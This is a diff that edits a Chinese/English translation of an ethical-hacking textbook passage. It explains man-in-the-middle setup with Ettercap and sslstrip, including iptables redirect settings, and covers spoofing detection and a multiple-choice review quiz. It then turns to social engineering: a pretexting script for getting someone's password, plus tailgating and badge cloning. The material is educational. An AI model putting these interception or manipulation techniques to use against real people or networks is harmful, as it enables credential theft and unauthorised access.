-### *sslstrip*
+## `sslstrip`
 
 加密消息在捕获流量时带来困难。加密的设计初衷是端到端的，意味着中间不应该有介入。任何中间介入都违背了大多数加密方案的端到端预期。尽管如此，作为伦理黑客，我们的本性是尝试绕过规则、破坏规则。有方法可以尝试破解加密协议。当然，这在 SSL 仍被广泛使用时要容易得多。SSL 存在多个版本的漏洞，早在 TLS 被引入以取代 SSL 后，TLS 的早期版本也存在使其易受破解的漏洞。
 
@@ -8808,10 +9708,9 @@ dns_spoof: A [browser.pipe.aria.microsoft.com] spoofed to [107.170.40.56]
 
 
 
-
 正如我们在进行 DNS 劫持时所做的那样，`sslstrip` 需要我们在 `ARP` 劫持上就位。我们可以使用 `Ettercap` 来实现，方法与之前相同。我们需要像以前一样伪造 Internet 网关。我们在设置 `ARP` 劫持攻击时也需要监听远程连接。`sslstrip` 是 `Ettercap` 的一个插件，因此可以像启用 DNS 劫持插件一样启用该插件。这需要在 `Ettercap` 之前对其进行配置更改。`sslstrip` 需要知道所使用的防火墙命令，以便在防火墙上设置重定向。下面的行在 `/etc/ettercap/etter.conf` 文件中被注释掉了。如果你使用的是 `iptables`（这比 `ipchains` 更可能），则需要取消这些行的注释。
 
-[`/etc/ettercap/etter.conf`]
+`/etc/ettercap/etter.conf`
 
 ```
 # if you use iptables:
@@ -8821,7 +9720,7 @@ redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %por
 
 完成这些配置后，`sslstrip` 插件即可启用。它会执行 `iptables` 命令以启动重定向，从而让插件能够接收消息。下面是 `Ettercap` 内 `sslstrip` 开始运行的日志示例。
 
-**在 `Ettercap` 中运行 `sslstrip`**
+## 在 `Ettercap` 中运行 `sslstrip`
 
 ```
 Host 192.168.86.1 added to TARGET1
@@ -8840,7 +9739,7 @@ DHCP: [192.168.86.1] ACK : 0.0.0.0 255.255.255.0 GW 192.168.86.1 DNS 192.168.86.
 
 一旦 `iptables` 规则已就位，`sslstrip` 应该能够捕获所有 HTTPS 流量。不过，这前提是 HTTPS 连接使用的 SSL/TLS 版本易受 stripping 攻击影响；如果不是，则不会有任何流量。
 
-### Spoofing Detection（欺骗检测）
+## Spoofing Detection（欺骗检测）
 
 网络运营商和安全专业人员需要能够检测欺骗攻击。一个优秀的欺骗攻击可能在用户层面不可见，这意味着必须在网络层面进行检测。这可能来自于使用网络入侵检测系统（IDS），但你仍需了解这些检测是如何工作的。首先，让我们从 ARP 欺骗入侵说起。正如你所见，ARP 欺骗依赖于攻击者发送大量 ARP 响应。用户看不到这些操作，但网络监控会显示大量的 gratuitous ARP 消息。这表明 ARP 欺骗正在发生，并提供攻击者的 MAC 地址。
 
@@ -8852,16 +9751,16 @@ MAC 地址本身并不足以定位，尤其是当网络中所有设备来自同�
 
 DNS 劫持检测相对困难，尤其是当攻击者使用其他方式捕获出站 DNS 请求时。若出站请求的 IP 地址与入站响应的 IP 地址一致，则可能安全；若不一致，则也可能安全——这听起来有点矛盾。DNS 的问题在于响应可能来自不同的地址，取决于 DNS 服务器的配置。更好的做法是使用本地 DNS 服务器，并将其配置为使用 TCP 而非 UDP。TCP 的三次握手能够更好地防止欺骗，或至少在防欺骗方面优于 UDP。你还可以确保本地 DNS 服务器启用 DNS 安全扩展（DNSSEC），通过对所通信服务器进行 cryptographic verification。
 
-DHCP 星 vation（DHCP starvation）攻击也可以被检测。如果突然出现来自意外 IP 地址的 DHCP 响应，这很可能是恶意活动。这可能是 DHCP 星 vation 攻击的结果，也可能是攻击者在本地网络部署一个 DHCP 服务器，因为某些本地设备会充当 DHCP 代理，将请求转发到远程服务器。本地服务器响应更快，但如果大量的 `DHCPDISCOVER` 请求从未被接受，则可能是 DHCP 星 vation 攻击的强烈迹象。
+DHCP starvation 攻击也可以被检测。如果突然出现来自意外 IP 地址的 DHCP 响应，这很可能是恶意活动。这可能是 DHCP starvation 攻击的结果，也可能是攻击者在本地网络部署一个 DHCP 服务器，因为某些本地设备会充当 DHCP 代理，将请求转发到远程服务器。本地服务器响应更快，但如果大量的 `DHCPDISCOVER` 请求从未被接受，则可能是 DHCP starvation 攻击的强烈迹象。
 
-
-
-
-1. 哪个硬件厂商在交换机上使用 *SPAN* 这个术语？
+1. 哪个硬件厂商在交换机上使用 `SPAN` 这个术语？
 
    1. HP  
+
    2. 3COM  
+
    3. Cisco  
+
    4. Juniper  
 
 2. 如果你看到下面的命令行，你捕获的是什么？
@@ -8871,8 +9770,11 @@ DHCP 星 vation（DHCP starvation）攻击也可以被检测。如果突然出�
    ```
 
    1. 仅来自 192.168.10.5 的流量  
+
    2. 来自和去往 192.168.10.5 的流量  
+
    3. 仅到达 192.168.10.5 的流量  
+
    4. 除去 192.168.10.5 之外的所有流量  
 
 3. 在下面的数据包中，源端口是多少？
@@ -8882,43 +9784,61 @@ DHCP 星 vation（DHCP starvation）攻击也可以被检测。如果突然出�
    ```
 
    1. 1310611430  
+
    2. 272087  
+
    3. 2048  
+
    4. 62882  
 
 4. 运行默认 `tcpdump`（不加任何参数）的一个缺点是什么？
 
    1. DNS 请求  
+
    2. 信息不足  
+
    3. 序列号不显示  
+
    4. `tcpdump` 在没有额外参数的情况下不运行  
 
 5. Berkeley Packet Filter 在哪个协议层工作？
 
    1. 互联网层  
+
    2. 传输层  
+
    3. 数据链路层  
+
    4. 协议层  
 
 6. 什么是没有对应 ARP 请求的 ARP 响应？
 
    1. Is‑at 响应  
+
    2. Who‑has ARP  
+
    3. Gratuitous ARP  
+
    4. IP 响应  
 
 7. 哪个 Wireshark 功能会为数据包捕获中按协议层排序的每个协议提供百分比？
 
    1. Conversations  
+
    2. Endpoints  
+
    3. Protocol hierarchy  
+
    4. Statistics view  
 
 8. 如果你想只打印捕获包中的特定字段，应该使用哪个程序？
 
    1. `fielddump`  
+
    2. `tcpdump`  
+
    3. `wiredump`  
+
    4. `tshark`  
 
 9. 下面的时间戳显示的是什么？
@@ -8928,8 +9848,11 @@ DHCP 星 vation（DHCP starvation）攻击也可以被检测。如果突然出�
    ```
 
    1. 自 1970 年以来的时间  
+
    2. 一天中的时间  
+
    3. 自包开始以来的时间  
+
    4. 这里没有时间  
 
 10. 这段摘要中使用的协议是什么？
@@ -8939,50 +9862,71 @@ DHCP 星 vation（DHCP starvation）攻击也可以被检测。如果突然出�
     ```
 
     1. TLS  
+
     2. UDP  
+
     3. IP  
+
     4. TCP  
 
 11. 哪个程序可以用于进行欺骗攻击并且支持插件？
 
     1. `arpspoof`  
+
     2. `fragroute`  
+
     3. Ettercap  
+
     4. `sslstrip`  
 
 12. 在使用 Ettercap 进行 DNS 欺骗攻击前，你需要做什么？
 
     1. 设置端口镜像（port span）。  
+
     2. 启动 Wireshark。  
+
     3. ARP 欺骗。  
+
     4. 配置 `sslstrip`。  
 
 13. 哪个命令行参数用于在 `tcpdump` 中禁用名称解析？
 
     1. `-n`  
+
     2. `-i`  
+
     3. `-r`  
+
     4. `-x`  
 
 14. 为什么在层 4 可能会显示比层 2 更多的端点？
 
     1. 层 4 通过层 2 复用。  
+
     2. 系统可能会向同一主机发起多个连接。  
+
     3. 端口比 MAC 地址更多。  
+
     4. IP 地址决定端点。  
 
 15. 你会使用 `sslstrip` 做什么？
 
     1. 获取明文流量  
+
     2. 移除所有 SSL 请求  
+
     3. 将 SSL 转换为 TLS  
+
     4. 将 TLS 转换为 SSL  
 
 16. 为什么可能会遇到 `sslstrip` 的问题？
 
     1. `sslstrip` 已经被废弃。  
+
     2. `sslstrip` 不兼容较新的 TLS 版本。  
+
     3. `sslstrip` 不支持 TLS。  
+
     4. `sslstrip` 只能与 Ettercap 配合使用。  
 
 17. 下面这行表示什么？
@@ -8993,115 +9937,116 @@ DHCP 星 vation（DHCP starvation）攻击也可以被检测。如果突然出�
 
     这行表示序列号为 4361（相对序列号）。
 
+    1. 显示的序列号并非真实的序列号。
 
-1. 显示的序列号并非真实的序列号。
+    2. 显示的序列号尚未递增。
 
-2. 显示的序列号尚未递增。
+    3. 显示的序列号不足。
 
-3. 显示的序列号不足。
-
-4. 显示的序列号是确认号。
+    4. 显示的序列号是确认号。
 
 18. 关于 Wireshark 提供的 `[TCP Segment Len: 35]`，你能说些什么？
 
-1. 窗口大小已变化。
+    1. 窗口大小已变化。
 
-2. Wireshark 推断了该信息。
+    2. Wireshark 推断了该信息。
 
-3. Wireshark 从头部信息中提取了它。
+    3. Wireshark 从头部信息中提取了它。
 
-4. Wireshark 在下方有更多细节。
+    4. Wireshark 在下方有更多细节。
 
 19. 端口桥接（port spanning）能克服什么问题？
 
-1. 交换机不支持第 3 层。
+    1. 交换机不支持第 3 层。
 
-2. 交换机聚合端口。
+    2. 交换机聚合端口。
 
-3. 交换机过滤流量。
+    3. 交换机过滤流量。
 
-4. 交换机不可靠。
+    4. 交换机不可靠。
 
 20. `/etc/ettercap/etter.dns` 文件的用途是什么？
 
-1. 为 Ettercap 启用防火墙规则
+    1. 为 Ettercap 启用防火墙规则
 
-2. 配置主机名到 IP 地址
+    2. 配置主机名到 IP 地址
 
-3. 为 Ettercap 设置邮件
+    3. 为 Ettercap 设置邮件
 
-4. 在 Ettercap 中禁用 ARP 欺骗
+    4. 在 Ettercap 中禁用 ARP 欺骗
 
 21. 如果在 `ifconfig` 输出中看到以下内容，你能说是什么情况正在发生？
 
-```
-eth0: flags=8963<UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
-options=50b<RXCSUM,TXCSUM,VLAN_HWTAGGING,AV,CHANNEL_IO>
-ether 14:98:77:31:b2:33
- inet6 fe80::10c6:713a:e86f:556d%en0 prefixlen 64 secured scopeid 0x7
- inet 192.168.1.144 netmask 0xffffff00 broadcast 192.168.1.255
- inet6 2601:18d:8b7f:e33a::52 prefixlen 64 dynamic
- inet6 fd23:5d5f:cd75:40d2:87:38bc:9448:3407 prefixlen 64 autoconf secured
- nd6 options=201<PERFORMNUD,DAD>
- media: autoselect (1000baseT <full-duplex,flow-control,energy-efficient-ethernet)
- status: active
-```
+    ```
+    eth0: flags=8963<UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
+    options=50b<RXCSUM,TXCSUM,VLAN_HWTAGGING,AV,CHANNEL_IO>
+    ether 14:98:77:31:b2:33
+     inet6 fe80::10c6:713a:e86f:556d%en0 prefixlen 64 secured scopeid 0x7
+     inet 192.168.1.144 netmask 0xffffff00 broadcast 192.168.1.255
+     inet6 2601:18d:8b7f:e33a::52 prefixlen 64 dynamic
+     inet6 fd23:5d5f:cd75:40d2:87:38bc:9448:3407 prefixlen 64 autoconf secured
+     nd6 options=201<PERFORMNUD,DAD>
+     media: autoselect (1000baseT <full-duplex,flow-control,energy-efficient-ethernet)
+     status: active
+    ```
 
-1. ARP 欺骗攻击
+    1. ARP 欺骗攻击
 
-2. ARP 洪水攻击
+    2. ARP 洪水攻击
 
-3. 网络嗅探
+    3. 网络嗅探
 
-4. 中间人攻击
+    4. 中间人攻击
 
-22. 以下哪项不是 DHCP 餓餓（starvation）攻击对受害者的结果？
+22. 以下哪项不是 DHCP starvation 攻击对受害者的结果？
 
-1. 攻击者获取新 IP 地址
+    1. 攻击者获取新 IP 地址
 
-2. 攻击者设置默认网关
+    2. 攻击者设置默认网关
 
-3. 攻击者设置 DNS 服务器
+    3. 攻击者设置 DNS 服务器
 
-4. 服务拒绝
+    4. 服务拒绝
 
 23. 如果你在网络中突然看到大量的 DHCPDISCOVER 包，你可能会开始调查什么？
 
-1. ARP 欺骗
+    1. ARP 欺骗
 
-2. 网络嗅探
+    2. 网络嗅探
 
-3. DHCP 餓餓攻击
+    3. DHCP starvation 攻击
 
-4. DNS 中毒
+    4. DNS 中毒
 
 24. 哪种网络技术让攻击者更难进行嗅探？
 
-1. 集线器
+    1. 集线器
 
-2. DHCP
+    2. DHCP
 
-3. 交换机
+    3. 交换机
 
-4. 邮件服务器
+    4. 邮件服务器
 
 25. 如果你的 `sslstrip` 会话进行得不顺利，你可能会怀疑什么？
 
-1. 所有会话都是 SSL v3。
+    1. 所有会话都是 SSL v3。
 
-2. 所有会话都是 TLS v1.0。
+    2. 所有会话都是 TLS v1.0。
 
-3. 所有会话都是 TLS v1.1。
+    3. 所有会话都是 TLS v1.1。
 
-4. 所有会话都是 TLS v1.3。
+    4. 所有会话都是 TLS v1.3。
 
 # Chapter 10  
 
-Social Engineering
+## Social Engineering
 
 At the time this is being written, about 80 percent of attacks are thought to involve social engineering of some sort. This makes learning about social engineering significant. If the attackers are using it, you should be using it too. Ultimately, social engineering attacks are going to be very effective avenues into a network so you can continue to perform testing. This would be especially true when it comes to red teaming, where you are likely to have the cuffs taken off, as it were, and you have more latitude in your tactics.
 
 You may be familiar with some basic social engineering strategies like phishing, simply because it's so common. Social engineering isn't just about sending emails, though. There are other social engineering strategies. Ultimately, any means of manipulating someone to do something they shouldn't or wouldn't otherwise do is social engineering. Social engineering brings in a lot of psychology and elements of human nature, so essentially you are using the way people are against them.
+
+
 
 Beyond the basics of social engineering, including how and why it works, there is also social engineering outside the virtual world. A skilled social engineer can get a lot of people to do what the engineer wants them to do. In the digital space, there is phishing, of course, but even phishing can make use of other elements, including rogue websites. Rogue websites may be used even without the phishing component, and they are called *rogue* because either they are controlled by an attacker or there may be malware installed by an attacker within a legitimate website.
 
@@ -9111,21 +10056,19 @@ Speaking of rogue, an attacker may create a rogue wireless access point. This wo
 
 Social engineering, regardless of what it was called or how it was thought of, has been around probably as long as humans have been around. You may call it manipulation if you like, but in the information security community, it's called *social engineering*. The objective is to convince or manipulate someone into doing something they wouldn't normally do for someone they don't know. There are a number of techniques for doing that. They are generally considered to be related to the science of influence. Robert Cialdini proposed six principles as part of his theory of influence. They are as follows, and understanding these principles may help you start to understand how to influence or manipulate people:
 
-*   **Reciprocity**   People will generally feel like they want to or may be obligated to respond to a kindness or favor. You may feel this way if a company gives away free samples. If you get one of these free samples, you may be inclined to feel like you should buy the product in response.
+-   **Reciprocity**   People will generally feel like they want to or may be obligated to respond to a kindness or favor. You may feel this way if a company gives away free samples. If you get one of these free samples, you may be inclined to feel like you should buy the product in response.
 
-*   **Commitment**   If someone commits to something, either in writing or orally, they are more inclined to follow through on that commitment.
+-   **Commitment**   If someone commits to something, either in writing or orally, they are more inclined to follow through on that commitment.
 
-*   **Social Proof**   Think about social proof as peer influence. If you see someone else doing something, such as using a product, you will see that it is acceptable to do that. You may therefore be more willing to try the product, or whatever it is you've seen.
+-   **Social Proof**   Think about social proof as peer influence. If you see someone else doing something, such as using a product, you will see that it is acceptable to do that. You may therefore be more willing to try the product, or whatever it is you've seen.
 
-*   **Authority**   If you've ever been pulled over by the police, you can recognize this one. Even if you haven't, you may think back to being at school. In general, people are inclined to follow authority figures and do what they say or ask.
+-   **Authority**   If you've ever been pulled over by the police, you can recognize this one. Even if you haven't, you may think back to being at school. In general, people are inclined to follow authority figures and do what they say or ask.
 
-*   **Liking**   If you like someone, you may be more easily swayed by what they think or do.
+-   **Liking**   If you like someone, you may be more easily swayed by what they think or do.
 
-*   **Scarcity**   This is easy to recognize. Think about Cabbage Patch Kids, if you go back that far, and also many of the product rollouts by Apple. The lack of availability of these products increases their perceived value. The perception of increased value makes them more desirable.
+-   **Scarcity**   This is easy to recognize. Think about Cabbage Patch Kids, if you go back that far, and also many of the product rollouts by Apple. The lack of availability of these products increases their perceived value. The perception of increased value makes them more desirable.
 
 Many of these go back to the early origins of humanity. Think about social proof as an example. If you were to see your neighbor eating something and then not dying, you would be more inclined to eat that thing yourself. You have proof that it's safe. Similarly, humans have long relied on one another to survive. If your neighbor does something for you, you would do something for them because that is how communities work. Essentially, these are deep‑seated modes of behaving because of the way our brains and neurochemistry work. We are wired to be susceptible to social engineering and scams because from an evolutionary standpoint we needed one another to survive, so trust is important.
-
-
 
 -   [信息是社交工程的主要目标](https://example.org)。这意味着攻击者试图让某人提供他们不应该提供的信息。可能是用户名和密码，也可能是其他个人信息，例如社会安全号码或信用卡号码。当然，信息并不是使用社交工程的唯一原因。你可能想让某人访问一个网站，在那里等待另一次攻击。你也可以让某人打开一封电子邮件。
 
@@ -9141,33 +10084,31 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 -   前文是一种借口或借口的说法，在社交工程的语境中，前文是你为解释接触而编造的故事。用前文进行社交工程攻击的行为称为 *pretexting*。这本质上是你将遵循的脚本。你会在这上面花费相当多的时间，因此需要清楚地理解如何最好地获取你想要的东西。
 
--  你从你想要从受害者那里得到的东西开始，这将是你故事的基础。例如，如果你想要某人的企业凭证，你就不会打电话称自己是他们的银行。故事必须符合实际情境。一旦你了解你想要什么，你就可以开始构建场景。你应该思考如何“钓”住对方，让他们倾向于与你互动。
+-   你从你想要从受害者那里得到的东西开始，这将是你故事的基础。例如，如果你想要某人的企业凭证，你就不会打电话称自己是他们的银行。故事必须符合实际情境。一旦你了解你想要什么，你就可以开始构建场景。你应该思考如何“钓”住对方，让他们倾向于与你互动。
 
--  虽然这看起来像是一次合法的联系，但下面是一个让某人参与的方式示例。它的效果如何是有争议的。最近，我接到一个电话，对方在问是否是 Aaron。我说他有错号码，他回答说他不是，但我可以帮忙。我在那时挂断了电话，但这很可能是一通为募捐而进行的电话，比如警察局基金会之类的，因为其做法与我之前收到的类似电话相同。这也体现了你故事和脚本的重要性。与我在说不存在这个人时犹豫不决不同，他立刻就有了答案。
+-   虽然这看起来像是一次合法的联系，但下面是一个让某人参与的方式示例。它的效果如何是有争议的。最近，我接到一个电话，对方在问是否是 Aaron。我说他有错号码，他回答说他不是，但我可以帮忙。我在那时挂断了电话，但这很可能是一通为募捐而进行的电话，比如警察局基金会之类的，因为其做法与我之前收到的类似电话相同。这也体现了你故事和脚本的重要性。与我在说不存在这个人时犹豫不决不同，他立刻就有了答案。
 
--  顺便说一下，这类电话引入了“承诺”的概念。他们冷电话并一直跟进，直到你承诺给他们钱。他们知道，如果他们只寄你一封信让你思考，你就不会继续。如果你告诉他们你会通过给他们的事业捐款来跟进，你很可能会真的这么做。
+-   顺便说一下，这类电话引入了“承诺”的概念。他们冷电话并一直跟进，直到你承诺给他们钱。他们知道，如果他们只寄你一封信让你思考，你就不会继续。如果你告诉他们你会通过给他们的事业捐款来跟进，你很可能会真的这么做。
 
--  在你制定故事的过程中，请记住社交工程的原则。如果你想让某人提供他们的信息，为他们做个忙或至少假装做个忙可以让他们感到欠你情。例如，你可以打电话称自己是公司的客服，注意到你的目标账户出现了很多伪造的登录尝试。你关心他们的个人信息，因为信用卡盗窃非常普遍，更不用说他们系统上存储的其他数据。他们会感激你的“帮助”，觉得你在保护他们的利益。然后，你可以提供帮助确认或甚至更改他们的密码。如果你让他们稍微害怕，可能就能绕过自然的怀疑。
+-   在你制定故事的过程中，请记住社交工程的原则。如果你想让某人提供他们的信息，为他们做个忙或至少假装做个忙可以让他们感到欠你情。例如，你可以打电话称自己是公司的客服，注意到你的目标账户出现了很多伪造的登录尝试。你关心他们的个人信息，因为信用卡盗窃非常普遍，更不用说他们系统上存储的其他数据。他们会感激你的“帮助”，觉得你在保护他们的利益。然后，你可以提供帮助确认或甚至更改他们的密码。如果你让他们稍微害怕，可能就能绕过自然的怀疑。
 
--  同样，当你收到来自 FedEx、American Express、Chase 或其他合法公司的电子邮件时，邮件不只是纯文本。它配有真实的徽标，并且使用了你在收到该公司邮件时会期待的相同字体。它看起来合法，或具有权威性。因为它看起来正确，而且它们很可能提供你想要的东西，所以它们会让你忽略实际的 URL（因为邮件客户端通常会隐藏它），直接点击链接。此时，你会被带到一个恶意网站。
+-   同样，当你收到来自 FedEx、American Express、Chase 或其他合法公司的电子邮件时，邮件不只是纯文本。它配有真实的徽标，并且使用了你在收到该公司邮件时会期待的相同字体。它看起来合法，或具有权威性。因为它看起来正确，而且它们很可能提供你想要的东西，所以它们会让你忽略实际的 URL（因为邮件客户端通常会隐藏它），直接点击链接。此时，你会被带到一个恶意网站。
 
 ### Social Engineering Vectors
 
--  一旦你开始考虑所有可能的前文，社交工程的手段就数不胜数。但归根结底，主要有四种被广泛使用的社交工程向量。它们如下：
+-   一旦你开始考虑所有可能的前文，社交工程的手段就数不胜数。但归根结底，主要有四种被广泛使用的社交工程向量。它们如下：
 
-*   **Phishing**   这个词 *phishing* 源自于 *fishing*，意思是抛出一些诱饵来获取信息。几十年前，人们用 *phreak* 来描述对电话网络进行操纵的人。由此，*fishing* 被改造为 *phishing*。Phishing 是一种通过欺骗性电子通信获取信息的技术。你可能会在电子邮件或即时通讯中看到 phishing 尝试。也可以在社交网络平台上看到。
+-   **Phishing**   这个词 *phishing* 源自于 *fishing*，意思是抛出一些诱饵来获取信息。几十年前，人们用 *phreak* 来描述对电话网络进行操纵的人。由此，*fishing* 被改造为 *phishing*。Phishing 是一种通过欺骗性电子通信获取信息的技术。你可能会在电子邮件或即时通讯中看到 phishing 尝试。也可以在社交网络平台上看到。
 
-*   **Vishing**   Voice phishing，或 vishing，是一种常见的做法。这是利用电话来 phish 信息。vishing 攻击也可以用于侦察。你可以用 vishing 获取目标的信息。
+-   **Vishing**   Voice phishing，或 vishing，是一种常见的做法。这是利用电话来 phish 信息。vishing 攻击也可以用于侦察。你可以用 vishing 获取目标的信息。
 
-*   **Smishing**   这是通过短信（SMS）进行的 phishing。你可能会收到来自陌生号码的短信，里面可能包含链接。在智能手机时代，目标只需点击链接即可被带到网站。
+-   **Smishing**   这是通过短信（SMS）进行的 phishing。你可能会收到来自陌生号码的短信，里面可能包含链接。在智能手机时代，目标只需点击链接即可被带到网站。
 
-*   **Impersonation**   这是一种常见的手段，我们在前面已经讨论过。这里指的是一种主要是物理向量的手段，你假装成其他人来获取进入建筑物或设施的权限。Impersonation 是许多社交工程攻击的核心组成部分。Impersonation  attack 也可以通过网站实现，用户以为自己访问的是某个站点，实际上却访问了另一个站点。
+-   **Impersonation**   这是一种常见的手段，我们在前面已经讨论过。这里指的是一种主要是物理向量的手段，你假装成其他人来获取进入建筑物或设施的权限。Impersonation 是许多社交工程攻击的核心组成部分。Impersonation attack 也可以通过网站实现，用户以为自己访问的是某个站点，实际上却访问了另一个站点。
 
--  这些只是少数几种攻击向量。大多数都基于通信手段，但其中一种是基于主要是物理机制的——假装成你不是。
+这些只是少数几种攻击向量。大多数都基于通信手段，但其中一种是基于主要是物理机制的——假装成你不是。
 
 ### Identity Theft
-
-
 
 -   [社交工程攻击的常见结果是身份盗窃。根据 `USA.gov` 的定义，身份盗窃是指某人窃取你的个人信息，意图进行欺诈。](https://wiki.example.org/feynmans_learning_method) 恶意分子企图窃取他们可以用于获取金钱的信息，这可能包括支付卡信息，或个人健康信息，后者可能被用于进行保险欺诈。此外，在数字世界中，身份指的是用户名和密码。访问信息和系统的权限来自身份和访问管理，而当今的身份和访问管理主要基于用户名和密码。本章其余部分主要讨论各种窃取身份信息的技术手段。
 
@@ -9187,7 +10128,7 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 ![FIGURE 10.2 RFID-based badge](img/c10f002.png)
 
-`**FIGURE 10.2**` RFID 徽章
+**FIGURE 10.2**  RFID 徽章
 
 尽管该方法常见，但仍存在绕过该门禁装置的风险，从而进入建筑物。首先是跟尾（tailgating）：如果你在入口等待，尤其在员工常规进入建筑的时间段，你可以在有人刷卡开门后跟随其进入。这并不意味着你能够自由进入建筑的所有区域。许多设施在内部门口也设有徽章阅读器。如果允许多个人通过外部门口，你仍可能再次利用跟尾方式进入所需区域。钻墙（piggybacking）类似，但需要员工的同意，而跟尾则不涉及同意。
 
@@ -9197,16 +10138,15 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 虽然这不算昂贵，但直接获取他人卡片使用可能更为便捷。一个优势是，虽然徽章上通常带有照片（但不总是），大多数人不会注意照片，也不会要求近距离查看。徽章常常通过腰带夹固定，背面朝外时照片或姓名不可见。这种情况经常出现在带有滚筒的腰带夹上，徽章会因自然摆动而倒转。
 
+
+
 虽然绕过徽章访问的方法并不总是容易，但上述跟尾和克隆已是常见手段。不过，使用徽章进入并不总是顺利，因为并非所有公司都允许门一直开启一段时间。
 
 ### 人阱（Man Traps）
 
 人阱是一种装置，能显著增加进入建筑物的难度，同时也让进入过程更加危险。如果存在人阱，你将面临两道相隔短距离的门。一旦你通过第一道门进入，就会被困在中间空间，直到第二道门打开。第二道门可能由保安操作，要求验证身份（如核对徽章上的姓名和照片），亦或采用第二种自动化身份验证方式。相比单纯的徽章访问，人阱的安全性更高，这可能是徽章克隆的用武之地，但前提是保安会将徽章与其他身份证明进行核对。
 
-
-
-
--   [其他实现方式](https://example.org)——只允许一个人在同一时间通过门口。你可能会发现有旋转门或闸机，这些设备会根据徽章或其他形式的身份验证来限制进入。闸机可以跳过，但完全封闭的旋转门则是另一回事。这里你无法尾随进入。旋转门一次只允许一个人进入。这类门通常会结合多种机制。第一种是徽章访问。你需要在阅读器上刷一下徽章。刷完后，你需要进入门的机制。一旦系统检测到你在场，就会让门部分旋转，只够让一个人通过。
+- [其他实现方式](https://example.org)——只允许一个人在同一时间通过门口。你可能会发现有旋转门或闸机，这些设备会根据徽章或其他形式的身份验证来限制进入。闸机可以跳过，但完全封闭的旋转门则是另一回事。这里你无法尾随进入。旋转门一次只允许一个人进入。这类门通常会结合多种机制。第一种是徽章访问。你需要在阅读器上刷一下徽章。刷完后，你需要进入门的机制。一旦系统检测到你在场，就会让门部分旋转，只够让一个人通过。
 
 一种绕过这种限制的方法是使用他人的徽章，在你使用之前。由于你可能时机掌握得不好，需要多次刷卡，这在实际操作中很常见，因此允许多次刷卡。如果你在公司内部有同谋，他们可以先为你刷卡进入，然后在门释放你后立即为自己刷卡。不过，你通常没有内部人员协助，这意味着需要寻找其他方法。
 
@@ -9220,17 +10160,17 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 这是一种物理访问控制方式，可能根本无法绕过。下面是你可能会遇到的一些生物识别类型。
 
-*   `Fingerprints` `Fingerprint` 扫描器很常见，部分原因是该技术已有较长历史。指纹识别也存在一些问题，包括读取器可能被高分辨率的复制品欺骗，除非读取器能够考虑体温。体温不是总是可靠的指标，因为它并不恒定（你有没有见过手特别冷的人？）。
+* `Fingerprints` `Fingerprint` 扫描器很常见，部分原因是该技术已有较长历史。指纹识别也存在一些问题，包括读取器可能被高分辨率的复制品欺骗，除非读取器能够考虑体温。体温不是总是可靠的指标，因为它并不恒定（你有没有见过手特别冷的人？）。
 
-*   `Iris Scanning` `Iris` 扫描是眼部扫描的更近期版本。虹膜是眼睛中含色的部分，同时会根据瞳孔扩张程度随光照变化。如果你仔细观察自己的眼睛，或更好的是观察他人的眼睛，你会发现虹膜颜色并非单一，而是有纹理图案。正是这个图案被用于身份验证。虹膜纹理对每个人都是唯一的。虹膜扫描的一个优势是使用光线照亮眼睛，因此可以在黑暗环境下工作。
+* `Iris Scanning` `Iris` 扫描是眼部扫描的更近期版本。虹膜是眼睛中含色的部分，同时会根据瞳孔扩张程度随光照变化。如果你仔细观察自己的眼睛，或更好的是观察他人的眼睛，你会发现虹膜颜色并非单一，而是有纹理图案。正是这个图案被用于身份验证。虹膜纹理对每个人都是唯一的。虹膜扫描的一个优势是使用光线照亮眼睛，因此可以在黑暗环境下工作。
 
-*   `Retinal Scanning` 视网膜位于眼球最深处，包含感光细胞，产生冲动供视神经使用。视网膜的血管纹理可用于识别个人。
+* `Retinal Scanning` 视网膜位于眼球最深处，包含感光细胞，产生冲动供视神经使用。视网膜的血管纹理可用于识别个人。
 
-*   `Voiceprint` `Voiceprint` 曾在电影 *Sneakers* 中展示过，如果你还没看过，可以去找找。它包含许多社会工程的想法以及一种非常奇怪的破解方式。声音识别读取器有很多问题。其中之一是你的声音会因多种因素（包括时间）而每天有所变化。感冒也会影响声音，这也是为什么很少有系统采用声音识别作为安全系统的实现原因。
+* `Voiceprint` `Voiceprint` 曾在电影 *Sneakers* 中展示过，如果你还没看过，可以去找找。它包含许多社会工程的想法以及一种非常奇怪的破解方式。声音识别读取器有很多问题。其中之一是你的声音会因多种因素（包括时间）而每天有所变化。感冒也会影响声音，这也是为什么很少有系统采用声音识别作为安全系统的实现原因。
 
-*   `Palm Vein Scanning` `Palm` 脉络扫描利用手掌上血管的纹理来唯一标识个体。
+* `Palm Vein Scanning` `Palm` 脉络扫描利用手掌上血管的纹理来唯一标识个体。
 
-*   `Gait Recognition` 步态识别系统利用视频记录某人走路的方式来判断是否匹配该个体。步态模式——身体的运动方式以及脚步落地——被认为足够独特，可以用于识别个人。
+* `Gait Recognition` 步态识别系统利用视频记录某人走路的方式来判断是否匹配该个体。步态模式——身体的运动方式以及脚步落地——被认为足够独特，可以用于识别个人。
 
 生物识别系统的有效性取决于成功率和失败率。特别重要的两个指标是假负率。假负率指本应被允许进入的人员被拒绝。虽然这比假正率不那么严重，但假负率仍可能导致需要重新尝试，或在极端情况下需要他人介入。假正率则指本不应获得访问权限的人员成功进入，导致未经授权人员在设施内活动。常用的两个指标是假拒率（FRR）和假接受率（FAR）。
 
@@ -9240,20 +10180,17 @@ Many of these go back to the early origins of humanity. Think about social proof
 
 这并不是像进入设施那样的物理行为，但仍然可以是获取信息的有利途径。如果不是这样，你就不会收到“Windows Support”打电话声称系统收到通知的电话。这里的伪造情境（pretexting）能发挥很大作用。事先进行大量侦察也很有帮助，这样你就不只是知道主电话号码。如果有多个设施，获取它们的电话号码同样有用。这在常见的伪造策略中尤为有效。
 
